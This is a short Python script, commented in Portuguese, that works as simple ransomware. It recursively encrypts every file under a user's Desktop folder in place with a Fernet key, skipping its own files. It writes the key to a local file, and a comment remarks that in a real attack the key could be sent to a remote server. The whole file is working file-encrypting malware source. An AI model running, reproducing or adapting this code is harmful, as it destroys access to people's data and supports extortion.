import os
from cryptography.fernet import Fernet

def encrypt_directory(directory, key):
    files = []
    # Lista de arquivos que não vão ser criptografados
    for file in os.listdir(directory):
        file_path = os.path.join(directory, file)
        if os.path.isfile(file_path) and file not in ["main.py", "decrypt.py", "thekey.key", "facebook.png"]:
            files.append(file_path)
        elif os.path.isdir(file_path):
            # Se for uma subpasta, criptografa todos seus arquivos internos
            encrypt_directory(file_path, key)
    # Para cada arquivo, ele irá:
    for file in files:
        # Abrir o arquivo como um binário
        with open(file, "rb") as the_file:
            contents = the_file.read() 
        # Criptografar o conteúdo
        contents_encrypted = Fernet(key).encrypt(contents)
        # Rescrever o conteúdo criptografado como um binário. 
        with open(file, "wb") as the_file:
            the_file.write(contents_encrypted)

# Defina o diretório a ser criptografado
directory_to_encrypt = "C:/Users/Wellinton/Desktop" #define aqui o caminho da pasta que deseja criptografar

# Gerar a chave de descriptografia dos arquivos
key = Fernet.generate_key()

# Em um ataque real, isso pode ser enviado para um servidor remoto, ou não HAHAHHAHA. 
with open("thekey.key", "wb") as the_key: 
    the_key.write(key)

# Criptografar arquivos no diretório atual e todos os subdiretórios
encrypt_directory(directory_to_encrypt, key)
